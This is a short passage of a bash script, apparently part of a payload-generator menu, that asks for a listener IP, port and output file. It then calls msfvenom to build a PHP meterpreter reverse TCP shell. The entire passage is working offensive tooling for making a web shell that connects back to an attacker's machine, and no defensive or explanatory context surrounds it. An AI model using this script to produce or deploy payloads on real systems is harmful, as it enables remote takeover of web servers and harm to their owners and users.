	echo "Platform : Web/PHP/Reverse TCP Shell"
	echo ""
	echo -n "Enter Listener IP: "
	read IP

	echo Using IP : $IP

        echo -n "Enter Listener Port: "
        read PORT

	echo Using Port : $PORT

	echo -n "Where Should I Say The Output?: "
	read OUTPUT

	echo Saving TO $OUTPUT

	msfvenom -p php/meterpreter_reverse_tcp LHOST=$IP LPORT=$PORT -f raw > $OUTPUT
